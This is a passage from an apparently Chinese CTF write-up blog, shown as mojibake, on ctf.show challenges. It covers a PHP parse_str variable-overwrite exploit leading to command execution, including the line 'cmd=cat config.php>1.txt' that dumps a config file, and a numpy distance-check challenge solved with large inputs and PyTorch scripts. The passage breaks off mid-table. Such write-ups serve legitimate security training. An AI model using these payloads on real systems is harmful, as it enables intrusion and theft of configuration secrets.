<p>URIå¹¶ä¸æ˜¯ä¸€ä¸ªç›´æ¥è®¿é—®çš„é“¾æ¥ï¼Œè€Œæ˜¯ç›¸å¯¹åœ°å€ï¼ˆç›¸å¯¹äºæµè§ˆå™¨ï¼ŒURIç­‰åŒäºURLï¼‰ã€‚è¿™ç§æ¦‚å¿µæ›´å¤šç”¨äºç¼–ç¨‹ä¸­ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡å¿…è¦æ¯æ¬¡ç¼–ç¨‹éƒ½ç”¨ç»å¯¹urlæ¥è·å–é¡µé¢ï¼Œè¿™æ ·è¿˜éœ€è¦è¿›è¡Œåˆ†å‰²â€œhttp://xx/xxxâ€å‰é¢é‚£ä¸€ä¸²ï¼Œæ‰€ä»¥ç¼–ç¨‹çš„æ—¶å€™ç›´æ¥request.getRequestURIå°±è¡Œäº†ï¼Œå¦‚æœé‡å®šå‘ï¼Œéœ€è¦ç”¨URLã€‚</p>
</li>
<li>
<p>URLç»§æ‰¿äº†æ‰€æœ‰URIçš„å†…å®¹ï¼Œæ‰€ä»¥å®ƒæ¯”URIæ›´åŠ è¯¦ç»†ï¼Œä½†æ˜¯URIæ˜¯URLçš„çˆ¶çº§ã€‚</p>
</li>
</ul>
<h5 id="php-parse_urlå‡½æ•°">PHP parse_urlå‡½æ•°</h5>
<p>è¯­æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">parse_url(string $url, int $component = -1): mixed
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‚æ•°ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$urlï¼šè¦è§£æçš„ URL å­—ç¬¦ä¸²ã€‚
</span></span><span class="line"><span class="cl">$componentï¼ˆå¯é€‰ï¼‰ï¼šç”¨äºæŒ‡å®šè¿”å›ç»“æœä¸­åŒ…å«çš„éƒ¨åˆ†ã€‚å¯ä»¥æ˜¯ä»¥ä¸‹å¸¸é‡ä¹‹ä¸€ï¼š
</span></span><span class="line"><span class="cl">PHP_URL_SCHEMEï¼šè¿”å›åè®®ï¼ˆä¾‹å¦‚ httpã€httpsï¼‰ã€‚
</span></span><span class="line"><span class="cl">PHP_URL_HOSTï¼šè¿”å›ä¸»æœºåã€‚
</span></span><span class="line"><span class="cl">PHP_URL_PORTï¼šè¿”å›ç«¯å£å·ã€‚
</span></span><span class="line"><span class="cl">PHP_URL_USERï¼šè¿”å›ç”¨æˆ·åã€‚
</span></span><span class="line"><span class="cl">PHP_URL_PASSï¼šè¿”å›å¯†ç ã€‚
</span></span><span class="line"><span class="cl">PHP_URL_PATHï¼šè¿”å›è·¯å¾„éƒ¨åˆ†ã€‚
</span></span><span class="line"><span class="cl">PHP_URL_QUERYï¼šè¿”å›æŸ¥è¯¢å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚
</span></span><span class="line"><span class="cl">PHP_URL_FRAGMENTï¼šè¿”å›ç‰‡æ®µæ ‡è¯†ç¬¦ï¼ˆä¹Ÿç§°ä¸ºé”šç‚¹ï¼‰éƒ¨åˆ†ã€‚
</span></span><span class="line"><span class="cl">é»˜è®¤å€¼ä¸º -1ï¼Œè¡¨ç¤ºè¿”å›åŒ…å«æ‰€æœ‰éƒ¨åˆ†çš„å…³è”æ•°ç»„ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿”å›å€¼ï¼š</p>
<p>å¦‚æœè§£ææˆåŠŸï¼Œå°†è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å« URL çš„å„ä¸ªç»„æˆéƒ¨åˆ†ã€‚
å¦‚æœè§£æå¤±è´¥ï¼Œå°†è¿”å› falseã€‚</p>
<h5 id="php-parse_str-å‡½æ•°">PHP parse_str() å‡½æ•°</h5>
<ul>
<li>parse_str() å‡½æ•°æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ã€‚</li>
<li>æ³¨ï¼šå¦‚æœæœªè®¾ç½® array å‚æ•°ï¼Œç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ã€‚</li>
<li>æ³¨ï¼šphp.ini æ–‡ä»¶ä¸­çš„ magic_quotes_gpc è®¾ç½®å½±å“è¯¥å‡½æ•°çš„è¾“å‡ºã€‚å¦‚æœå·²å¯ç”¨ï¼Œé‚£ä¹ˆåœ¨ parse_str() è§£æä¹‹å‰ï¼Œå˜é‡ä¼šè¢« addslashes() è½¬æ¢ã€‚</li>
</ul>
<h5 id="php-execå‡½æ•°">PHP exec()å‡½æ•°</h5>
<p>exec() ä¸è¾“å‡ºç»“æœï¼Œè¿”å›æœ€åä¸€è¡Œshellç»“æœï¼Œæ‰€æœ‰ç»“æœå¯ä»¥ä¿å­˜åˆ°ä¸€ä¸ªè¿”å›çš„æ•°ç»„é‡Œé¢ã€‚</p>
<h4 id="payload-3">payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET: /index.php?mode=0&amp;config[secret]=r1one&amp;secret=40234cce895a7b3058d4a4c241ae26d7
</span></span><span class="line"><span class="cl">// MD5(adminr1one)ï¼š40234cce895a7b3058d4a4c241ae26d7
</span></span><span class="line"><span class="cl">POST: cmd=cat config.php&gt;1.txt
</span></span><span class="line"><span class="cl">ç„¶åè®¿é—®1.txt
</span></span><span class="line"><span class="cl">è¿™é‡Œå…³äºsecretçš„å€¼ï¼Œ
</span></span><span class="line"><span class="cl">å¯ä»¥å•ç‹¬è®¾ç½®Cookie:secret=40234cce895a7b3058d4a4c241ae26d7
</span></span><span class="line"><span class="cl">ä¹Ÿå¯ä»¥ç›´æ¥åˆ©ç”¨URLè¿›è¡ŒGETä¼ å‚
</span></span><span class="line"><span class="cl">å› ä¸ºï¼Œå¦‚æœCookieæ²¡æœ‰è®¾ç½®secretçš„å€¼ï¼Œsecretä¸ºç©ºï¼Œç»è¿‡parse_strï¼Œè¿›è¡Œå˜é‡è¦†ç›–ï¼Œä¹Ÿä¼šæœ‰å€¼ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ç®€å•çš„æ•°æ®åˆ†æ">ç®€å•çš„æ•°æ®åˆ†æ</h2>
<p>æ‰“å¼€é¡µé¢ï¼Œå‘ç°</p>
<p><img src="/images/%e7%ae%80%e5%8d%95%e7%9a%84%e6%95%b0%e6%8d%ae%e5%88%86%e6%9e%90-1.png"
	
	
	
	loading="lazy"
	
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è®¿é—®http://49aa75ee-ea3f-4e12-b75f-ae589cf98959.challenge.ctf.show/source/model.txtå¾—åˆ°æºç 
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">D</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pData</span> <span class="o">=</span> <span class="p">[</span><span class="n">numpy</span><span class="o">.</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">(</span><span class="n">D</span><span class="p">)</span><span class="o">*</span><span class="mi">100</span><span class="p">,</span><span class="n">numpy</span><span class="o">.</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">(</span><span class="n">D</span><span class="p">)</span><span class="o">*</span><span class="mi">100</span><span class="p">,</span><span class="n">numpy</span><span class="o">.</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">(</span><span class="n">D</span><span class="p">)</span><span class="o">*</span><span class="mi">100</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">getlist</span><span class="p">(</span><span class="s1">&#39;data[]&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">float</span><span class="p">,</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">numpy</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span><span class="o">=</span><span class="s2">&#34;æ•°æ®è½¬æ¢å¤±è´¥&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">distance</span> <span class="o">=</span><span class="p">[</span><span class="n">numpy</span><span class="o">.</span><span class="n">linalg</span><span class="o">.</span><span class="n">norm</span><span class="p">(</span><span class="n">A</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="k">for</span> <span class="n">A</span> <span class="ow">in</span> <span class="n">pData</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">avgdist</span> <span class="o">=</span> <span class="n">numpy</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">numpy</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">distance</span> <span class="o">-</span> <span class="n">numpy</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">distance</span><span class="p">))</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">avgdist</span><span class="o">&lt;</span><span class="mf">0.001</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">msg</span><span class="o">=</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">msg</span><span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;æ‚¨çš„æ•°æ®ä¸ä¸‰ä¸ªèšç±»ä¸­å¿ƒçš„æ¬§æ‹‰è·ç¦»åˆ†åˆ«æ˜¯&lt;br&gt;&lt;br&gt;</span><span class="si">{</span><span class="n">distance</span><span class="si">}</span><span class="s2">å‡æ–¹å·®ä¸º:</span><span class="si">{</span><span class="n">avgdist</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span><span class="o">=</span><span class="s2">&#34;æœªæäº¤æ•°æ®æˆ–æ•°æ®ç»´åº¦æœ‰è¯¯&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="é¢˜ç›®åˆ†æ-4">é¢˜ç›®åˆ†æ</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¿™æ®µä»£ç çš„ç›®çš„æ˜¯å¯¹ä»è¯·æ±‚ä¸­è·å–çš„æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå¹¶è®¡ç®—æ•°æ®ä¸ä¸‰ä¸ªèšç±»ä¸­å¿ƒçš„æ¬§æ‹‰è·ç¦»å’Œå‡æ–¹å·®ã€‚
</span></span><span class="line"><span class="cl">å…ˆç”Ÿæˆä¸‰ä¸ªDç»´å‘é‡ï¼Œç„¶åå½“æäº¤ä¸€ä¸ªå‘é‡æ—¶ï¼Œä¼šè¿”å›æäº¤çš„å‘é‡ä¸è¿™ä¸‰ä¸ªå‘é‡çš„æ¬§æ‹‰è·ç¦»ï¼Œå½“æäº¤å‘é‡ä¸è¿™ä¸‰ä¸ªå‘é‡è·ç¦»çš„å¹³å‡å€¼å°äº0.001æ—¶ï¼Œæ˜¾ç¤ºflagã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="payload-4">payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">åœ¨ç†è®ºä¸Šï¼ŒNumPyå¯ä»¥å¤„ç†ä»»æ„å¤§å°çš„æ•´æ•°ï¼ŒåŒ…æ‹¬éå¸¸å¤§çš„æ•´æ•°ã€‚ç„¶è€Œï¼Œåœ¨å®é™…åº”ç”¨ä¸­ï¼ŒNumPyçš„æ•´æ•°ç±»å‹çš„èŒƒå›´å—é™äºè®¡ç®—æœºçš„å†…å­˜å’Œå¤„ç†èƒ½åŠ›ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NumPyæä¾›äº†ä¸åŒç²¾åº¦çš„æ•´æ•°ç±»å‹ï¼Œå¦‚int8ã€int16ã€int32ã€int64ç­‰ï¼Œä»¥åŠå¯¹åº”çš„æ— ç¬¦å·æ•´æ•°ç±»å‹ã€‚è¿™äº›ç±»å‹åœ¨å­˜å‚¨æ•´æ•°æ—¶å…·æœ‰ä¸åŒçš„ä½æ•°å’Œå–å€¼èŒƒå›´ã€‚ä¾‹å¦‚ï¼Œint64ç±»å‹å¯ä»¥è¡¨ç¤ºèŒƒå›´åœ¨-9223372036854775808åˆ°9223372036854775807ä¹‹é—´çš„æ•´æ•°ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">numpyå¤„ç†æ•°æ®ï¼Œ
</span></span><span class="line"><span class="cl">ç›´æ¥è¶…å¤§æ•°9999999999999999999999999999999999999999999999999999999999999999999999
</span></span><span class="line"><span class="cl">å¾—åˆ°flag
</span></span><span class="line"><span class="cl">è¿™é‡Œå¥½åƒåˆ©ç”¨çš„å°±æ˜¯numpyæ²¡åŠæ³•å¤„ç†è¿™ä¹ˆå¤§çš„æ•°ï¼Œæ‰€ä»¥æ»¡è¶³äº†å¹³å‡å€¼å°äº0.001ï¼Œå¾—å‡ºäº†flagï¼Ÿ
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="å®˜æ–¹payload">å®˜æ–¹payload</h4>
<p>è¯•äº†åŠå¤©ï¼Œæ²¡æ•´æ˜ç™½ï¼Œå…ˆæ”¾ç€å§</p>
<p>1ã€å…ˆç”¨éšæœºæ•°çš„æ–¹æ³•ï¼Œç”Ÿæˆè‹¥å¹²å‘é‡è¿›è¡Œè¯•æ¢ã€‚å–å¾—è¿™äº›å‘é‡ä¸ä¸‰ä¸ªæŒ‡å®šç‚¹çš„æ¬§æ‹‰è·ç¦»</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rx</span><span class="o">=</span><span class="p">[</span> <span class="n">np</span><span class="o">.</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">(</span><span class="n">D</span><span class="p">)</span><span class="o">*</span><span class="mi">100</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="n">ry</span><span class="o">=</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="o">.</span><span class="n">tqdm</span><span class="p">(</span><span class="n">rx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">txt</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;data[]&#39;</span><span class="p">:</span><span class="nb">list</span><span class="p">(</span><span class="n">i</span><span class="p">)})</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># print(txt)</span>
</span></span><span class="line"><span class="cl">        <span class="n">ry</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;(\[.*\])&#34;</span><span class="p">,</span><span class="n">txt</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;flag&#34;</span> <span class="ow">in</span> <span class="n">txt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">txt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">txt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="n">ry</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">ry</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>2ã€ä½¿ç”¨ä¸€ä¸ªç•¸å½¢ç¥ç»ç½‘ç»œï¼Œæ±‚å€¼ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">CTFNN</span><span class="p">(</span><span class="n">nn</span><span class="o">.</span><span class="n">Module</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">D</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">L</span> <span class="o">=</span> <span class="n">nn</span><span class="o">.</span><span class="n">Linear</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">D</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">zero</span><span class="o">=</span><span class="n">torch</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">forward</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">y</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">L</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">zero</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">torch</span><span class="o">.</span><span class="n">linalg</span><span class="o">.</span><span class="n">norm</span><span class="p">(</span><span class="n">y</span><span class="o">-</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">loss</span><span class="p">(</span><span class="n">nn</span><span class="o">.</span><span class="n">Module</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arc</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">forward</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">torch</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">x</span><span class="o">-</span><span class="n">y</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è®­ç»ƒä¹‹åï¼Œctfmodel.L.bias.tolist() å³ä¸ºæ‰€æ±‚ç‚¹åæ ‡ã€‚</p>
<p>3ã€ç”¨å¦ä¸€ä¸ªç¥ç»ç½‘ç»œè®­ç»ƒå‡ºä¸€ä¸ªè·ç¦»ä¸‰ä¸ªç‚¹è·ç¦»ç›¸ç­‰çš„ç‚¹æ¥ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">CTFNN2</span><span class="p">(</span><span class="n">nn</span><span class="o">.</span><span class="n">Module</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">D</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">L</span> <span class="o">=</span> <span class="n">nn</span><span class="o">.</span><span class="n">Linear</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">D</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">zero</span><span class="o">=</span><span class="n">torch</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">forward</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">L</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">zero</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">dist</span> <span class="o">=</span><span class="p">[</span><span class="n">torch</span><span class="o">.</span><span class="n">linalg</span><span class="o">.</span><span class="n">norm</span><span class="p">(</span><span class="n">A</span><span class="o">-</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">A</span> <span class="ow">in</span> <span class="n">tp</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">dist</span><span class="o">=</span><span class="n">torch</span><span class="o">.</span><span class="n">stack</span><span class="p">(</span><span class="n">dist</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">y</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">torch</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">dist</span> <span class="o">-</span> <span class="n">torch</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">dist</span><span class="p">))</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">y</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">loss2</span><span class="p">(</span><span class="n">nn</span><span class="o">.</span><span class="n">Module</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arc</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">forward</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">x</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">torch</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
